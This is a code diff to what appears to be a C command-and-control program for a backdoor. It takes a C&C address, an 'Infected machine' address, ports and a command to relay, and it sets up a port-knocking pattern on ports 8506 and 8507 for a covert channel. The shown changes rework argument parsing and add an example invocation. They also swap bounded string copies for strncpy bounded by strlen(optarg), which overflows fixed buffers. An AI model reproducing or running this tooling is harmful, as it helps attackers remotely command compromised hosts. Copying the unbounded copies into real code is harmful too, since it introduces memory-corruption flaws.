@@ -2,11 +2,13 @@
 
 static void print_usage(void) {
     puts("Usage options: \n"
-            "\t[cnc]\tIP address of Command and Control\n"
-            "\t[in]\tIP address of Infected machine\n"
-            "\t[cport]\tPort on Command and Control\n"
-            "\t[iport]\tPort on Infected machine\n"
-            "\t[cmd]\tCommand to send to the Infected machine\n");
+            "\t[--cnc]\t\tIP address of Command and Control\n"
+            "\t[--in]\t\tIP address of Infected machine\n"
+            "\t[--cport]\tPort on Command and Control\n"
+            "\t[--iport]\tPort on Infected machine\n"
+            "\t[--cmd]\t\tCommand to send to the Infected machine\n"
+            "\nExample:\n"
+            "\t./cnc --cnc 192.168.0.100 --in 192.168.0.101 --cport 8505 --dport 8505 --cmd \"echo hi\"\n");
 }
 
 static struct option long_options[] = {
@@ -20,16 +22,16 @@ static struct option long_options[] = {
 
 int main(int argc, char **argv){
     int arg;
-    unsigned short cnc_port, infected_port;
-    char cnc_ip[BUFFERSIZE], infected_ip[BUFFERSIZE];
-    unsigned char cmd[BUFFERSIZE];
+    unsigned short cnc_port = 0, infected_port = 0;
+    char cnc_ip[BUFFERSIZE] = "", infected_ip[BUFFERSIZE] = "";
+    unsigned char cmd[BUFFERSIZE] = "";
 
-    char *c = "c";
-    char *sip = CNCIP;
-    char *dip = INFECTEDIP;
-    unsigned short sport = SHPORT;
-    unsigned short dport = SHPORT;
-    unsigned char data[BUFSIZE] = "echo hi";
+    //char *c = "c";
+    //char *sip = CNCIP;
+    //char *dip = INFECTEDIP;
+    //unsigned short sport = SHPORT;
+    //unsigned short dport = SHPORT;
+    //unsigned char data[BUFSIZE] = "echo hi";
     pattern[0] = 14881; //port 8506 in u_short
     pattern[1] = 15137; //port 8507 in u_short this is for comparing in the ParseTCP function
     knocking[0] = 0; // initilizing the knocking
@@ -39,7 +41,7 @@ int main(int argc, char **argv){
     while(1) {
         int option_index = 0;
 
-        arg = getopt_long(argc, argv, SOCKOPTS, long_options, &option_index);
+        arg = getopt_long(argc, argv, "", long_options, &option_index);
 
         if(arg == -1) {
             break;
@@ -47,11 +49,11 @@ int main(int argc, char **argv){
 
         switch(arg) {
             case 0:
-                strncpy(cnc_ip, optarg, BUFFERSIZE);
+                strncpy(cnc_ip, optarg, strlen(optarg));
                 printf("CNC IP: %s\n", cnc_ip);
                 break;
             case 1:
-                strncpy(infected_ip, optarg, BUFFERSIZE);
+                strncpy(infected_ip, optarg, strlen(optarg));
                 printf("Infected IP: %s\n", infected_ip);
                 break;
             case 2:
@@ -63,7 +65,7 @@ int main(int argc, char **argv){
                 printf("Infected Port: %hu\n", infected_port);
                 break;
             case 4:
-                strncpy(cmd, optarg, BUFFERSIZE);
+                strncpy((char*)cmd, optarg, strlen(optarg));
                 printf("CMD: %s\n", cmd);
                 break;
             default:
@@ -71,6 +73,15 @@ int main(int argc, char **argv){
                 exit(1);
         }
 
+    }
+
+    if(strcmp(cnc_ip, "") == 0 ||
+                strcmp(infected_ip, "") == 0 ||
+                cnc_port == 0 ||
+                infected_port ==0 ||
+                strcmp((const char*) cmd, "") == 0) {
+        print_usage();
+        exit(1);
     }
 
     //covert_send(sip, dip, sport, dport, data, 0);
